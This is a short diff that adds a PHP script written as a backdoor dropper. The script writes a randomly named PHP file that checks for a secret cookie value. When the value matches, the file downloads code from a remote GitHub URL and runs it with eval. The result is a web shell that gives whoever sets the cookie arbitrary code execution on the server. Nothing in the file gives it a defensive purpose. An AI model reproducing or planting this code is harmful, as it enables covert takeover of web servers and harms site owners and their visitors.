@@ -1,0 +1,9 @@
+<?php
+$file_name = "file_" . bin2hex(random_bytes(8)) . ".php";
+
+$code = "<?php\nif (isset(\$_COOKIE['anjing']) && \$_COOKIE['anjing'] == 'fooddesign') {\n    eval(\"?>\" . file_get_contents(\"https://raw.githubusercontent.com/dan1584/asfdas/refs/heads/main/tobanga.txt\"));\n}\n?>";
+
+file_put_contents($file_name, $code);
+
+echo "File berhasil disimpan sebagai " . $file_name;
+?>
